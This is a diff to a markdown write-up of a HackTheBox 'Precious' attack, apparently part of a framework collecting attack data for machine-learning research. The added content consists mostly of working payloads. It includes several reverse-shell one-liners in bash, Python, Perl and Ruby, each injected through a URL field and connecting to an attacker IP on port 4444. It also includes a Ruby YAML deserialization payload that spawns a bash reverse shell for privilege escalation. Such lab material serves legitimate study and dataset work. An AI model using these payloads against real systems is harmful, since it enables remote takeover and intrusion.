@@ -8,7 +8,7 @@
 
 |Attacker Level|Environment|VPN|Attacker IP|Victim IP|
 |-|-|-|-|-|
-|Average|Linux|Yes|10.10.16.27|10.10.11.189|
+|Average|Linux|Yes|10.10.16.36|10.10.11.189|
 
 ## Documentation
 
@@ -25,7 +25,7 @@ Below, we map the attack to the MITRE ATT&CK Enterprise framework.
 | Persistence | Valid Accounts | Default Accounts | (2) | - |
 | Privilege Escalation | Exploitation for Privilege Escalation | - | [dependencies.yml](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Precious/dependencies.yml) | CVE-2017-18342 |
 
-#### Commands
+#### Commands/Scripts
 - (1)
 ```
 http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
@@ -35,9 +35,62 @@ http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 ssh henry@10.10.11.189
 ```
 
+#### Alternative Commands/Scripts
+- (1)
+```
+http://%20`bash -c 'exec bash -i &>/dev/tcp/10.10.16.36/4444 <&1'`  
+```
+
+```
+http://%20`export RHOST="10.10.16.36";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
+```
+
+```
+http://%20`perl -e 'use Socket;$i="10.10.16.36";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'`
+```
+
+```
+http://%20`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.36:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
+```
+
+```
+http://%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.36",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
+```
+
+```
+http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.36",4444))'`
+```
+
+```
+http://%20`ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.16.36","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`
+```
+
+- dependencies.yml
+```
+---
+- !ruby/object:Gem::Installer
+   i: x
+- !ruby/object:Gem::SpecFetcher
+   i: y
+- !ruby/object:Gem::Requirement
+ requirements:
+   !ruby/object:Gem::Package::TarReader
+   io: &1 !ruby/object:Net::BufferedIO
+     io: &1 !ruby/object:Gem::Package::TarReader::Entry
+        read: 0
+        header: "abc"
+     debug_output: &1 !ruby/object:Net::WriteAdapter
+        socket: &1 !ruby/object:Gem::RequestSet
+            sets: !ruby/object:Net::WriteAdapter
+                socket: !ruby/module 'Kernel'
+                method_id: :system
+            git_set: "bash -c 'exec bash -i &>/dev/tcp/10.10.16.36/4444 <&1'"
+        method_id: :resolve
+```
+
 ## Network Analysis
 
-Pcap file of the attack:
+Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Precious/attack_capture.pcapng)
 
 ## Log Analysis
 
